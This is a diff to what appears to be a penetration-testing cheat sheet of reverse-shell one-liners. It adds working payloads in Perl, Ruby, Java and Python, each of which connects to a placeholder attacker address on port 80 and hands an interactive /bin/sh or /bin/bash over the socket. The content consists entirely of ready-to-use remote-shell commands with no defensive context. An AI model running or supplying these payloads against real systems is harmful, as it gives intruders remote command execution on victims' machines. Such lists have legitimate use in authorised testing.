@@ -58,27 +58,39 @@ perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getproto
 
 # Perl Windows Reverse Shell
 
-```cmd
+```shell
 
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
+perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
 
 ```
 
-#
+# Ruby Reverse Shell
+
+```bash
+
+ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
 
 ```
 
-```
+# Java Reverse Shell
 
-#
+```bash
 
-```
-
-```
-
-#
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
 
 ```
+
+# Python Reverse Shell
+
+```bash
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
 
 ```
